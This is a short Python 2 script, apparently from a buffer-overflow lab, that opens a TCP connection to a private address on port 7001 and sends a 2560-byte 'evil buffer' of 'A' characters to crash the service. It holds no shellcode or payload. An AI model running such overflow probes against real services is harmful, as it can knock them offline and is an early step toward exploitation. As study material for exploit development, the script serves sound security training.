#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  buffer = "A" * 2560
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7001))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"

